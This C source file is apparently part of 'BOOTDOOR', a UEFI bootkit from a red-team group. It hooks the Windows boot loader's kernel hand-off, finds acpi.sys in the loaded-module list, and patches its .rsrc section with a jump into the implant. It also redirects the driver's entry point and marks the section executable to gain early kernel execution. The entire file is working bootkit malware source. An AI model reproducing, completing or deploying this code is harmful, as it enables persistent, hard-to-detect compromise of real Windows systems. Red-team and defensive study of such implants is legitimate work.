/*!
 *
 * BOOTDOOR
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	ULONG		OsMajorVersion;
	ULONG		OsMinorVersion;
	ULONG		Length;
	ULONG		Reserved;
	LIST_ENTRY	LoadOrderListHead;
	LIST_ENTRY	MemoryDescriptorListHead;
	LIST_ENTRY	BootDriverListHead;
} PARAMETER_BLOCK, *PPARAMETER_BLOCK ;

#define H_STR_ACPI	0x5dc8930f /* acpi.sys */
#define H_STR_RSRC	0x0b6dca4d /* .rsrc */

/*!
 *
 * Purpose:
 *
 * Inserts a hook into a kernel driver to
 * achieve execution within the windows
 * kernel.
 *
!*/
D_SEC( B ) VOID EFIAPI OslArchTransferToKernel( PVOID LoaderBlock, PVOID Entry )
{
	PCFG			Cfg = NULL;
	PVOID			Jmp = NULL;
	PRNTBL			Tb1 = NULL;
	PLIST_ENTRY		Hdr = NULL;
	PLIST_ENTRY		Ent = NULL;
	PPARAMETER_BLOCK	Blk = NULL;
	PIMAGE_DOS_HEADER	Ntd = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;
	PLDR_DATA_TABLE_ENTRY	Ldr = NULL;

	Tb1 = C_PTR( G_PTR( RnTbl ) );
	Blk = C_PTR( LoaderBlock );
	Hdr = & Blk->LoadOrderListHead;
	Ent = Hdr->Flink;

	/* Enumerate list of loaded modules */
	while ( C_PTR( Ent ) != C_PTR( Hdr ) ) {
		Ldr = CONTAINING_RECORD( Ent, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks );

		/* Search for acpi.sys */
		if ( HashString( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length ) == H_STR_ACPI ) {
			/* Setup header pointers */
			Dos = C_PTR( Ldr->DllBase );
			Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
			Sec = IMAGE_FIRST_SECTION( Nth );

			/* Enumerate the sections */
			for ( INT Idx = 0 ; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
				/* Is the .rsrc section? */
				if ( HashString( & Sec[ Idx ].Name, 0 ) == H_STR_RSRC ) {

					/* Search for base of the kernel by PAGE */
					Ntd = C_PTR( U_PTR( U_PTR( Entry ) &~ ( 0x1000 - 1 ) ) );
					while ( Ntd->e_magic != IMAGE_DOS_SIGNATURE ) {
						Ntd = C_PTR( U_PTR( Ntd ) - 0x1000 );
					};

					/* Get pointer to the config */
					Cfg = C_PTR( U_PTR( U_PTR( GetIp( ) ) + 11 ) );

					/* Save Information For DrvMain */
					Tb1->BufferSize                      = Cfg->Length;
					Tb1->BufferBase                      = C_PTR( & Cfg->Buffer );
					Tb1->KernelBase                      = C_PTR( Ntd );
					Tb1->TargetDriverSection             = C_PTR( & Sec[ Idx ] );
					Tb1->TargetDriverImageBase           = C_PTR( Ldr->DllBase );
					Tb1->TargetDriverLoaderEntry         = C_PTR( Ldr );
					Tb1->TargetDriverAddressOfEntryPoint = Nth->OptionalHeader.AddressOfEntryPoint;

					/* Calculacate the virtual address to jump to */
					Jmp = C_PTR( U_PTR( G_PTR( DrvMain ) ) - U_PTR( G_PTR( EfiMain ) ) );
					Jmp = C_PTR( U_PTR( Jmp ) + U_PTR( Tb1->ImageAddrVir ) );

					/* Insert a hook safely! */
					*( PUINT16 )( C_PTR( U_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress + 0x00 ) ) ) = ( UINT16 )( 0x25ff );
					*( PUINT32 )( C_PTR( U_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress + 0x02 ) ) ) = ( UINT32 )( 0 );
					*( PUINT64 )( C_PTR( U_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress + 0x06 ) ) ) = ( UINT64 )( Jmp );

					/* Insert our new entrypoint */
					Ldr->EntryPoint                         = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress );
					Nth->OptionalHeader.AddressOfEntryPoint = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress );

					/* Insert the -x permission */
					Sec[ Idx ].Characteristics |=  IMAGE_SCN_MEM_EXECUTE;
				};
			};
		};
		/* Skip to the next entry */
		Ent = C_PTR( Ent->Flink );
	};

	/* Execute the original block of memory safely! */
	( ( __typeof__( OslArchTransferToKernel ) * ) G_PTR( OslCg ) )( LoaderBlock, Entry );
};
